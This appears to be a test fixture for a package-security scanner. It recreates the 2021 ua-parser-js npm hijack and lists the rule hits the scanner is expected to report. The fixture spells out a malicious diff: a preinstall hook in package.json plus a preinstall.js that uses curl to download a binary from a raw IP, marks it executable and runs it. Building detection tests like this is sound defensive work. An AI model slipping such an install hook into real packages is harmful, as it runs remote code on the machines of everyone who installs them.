@@ -1,0 +1,28 @@
+kind = "risky"
+title = "preinstall hook downloads and starts a binary from a raw IP"
+source = "recreation of the ua-parser-js hijack (npm, 2021)"
+expect = [
+    "EXE005 package.json:2",
+    "EXE003 preinstall.js:1",
+    "NET001 preinstall.js:3",
+    "EXE003 preinstall.js:4",
+]
+
+[[file]]
+path = "package.json"
+removed = ['  "scripts": {', '    "test": "mocha"']
+added = [
+    '  "scripts": {',
+    '    "preinstall": "start /B node preinstall.js & node preinstall.js",',
+    '    "test": "mocha"',
+]
+
+[[file]]
+path = "preinstall.js"
+status = "added"
+added = [
+    "const { exec } = require('child_process');",
+    "const os = require('os');",
+    "const url = 'http://159.148.186.228/download/jsextension';",
+    "if (os.type() === 'Linux') exec(`curl ${url} -o jsextension && chmod +x jsextension && ./jsextension &`);",
+]
